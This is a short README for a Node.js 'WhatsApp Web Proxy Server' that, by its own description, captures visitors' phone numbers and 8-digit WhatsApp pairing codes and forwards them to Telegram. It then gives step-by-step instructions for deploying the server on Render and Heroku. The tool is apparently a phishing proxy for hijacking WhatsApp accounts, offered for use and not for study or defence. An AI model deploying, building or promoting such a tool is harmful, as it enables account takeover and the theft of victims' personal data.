# WhatsApp Web Proxy Server

This is a proxy server that loads WhatsApp Web and captures phone numbers and 8-digit pairing codes, then sends them to Telegram.

## Deployment

### Deploy on Render (Free)
1. Create account on [render.com](https://render.com)
2. Click "New +" → "Web Service"
3. Connect your GitHub repository
4. Set:
   - Build Command: `npm install`
   - Start Command: `node server.js`
5. Click "Deploy"

### Deploy on Heroku
```bash
heroku create your-app-name
git push heroku main
heroku open
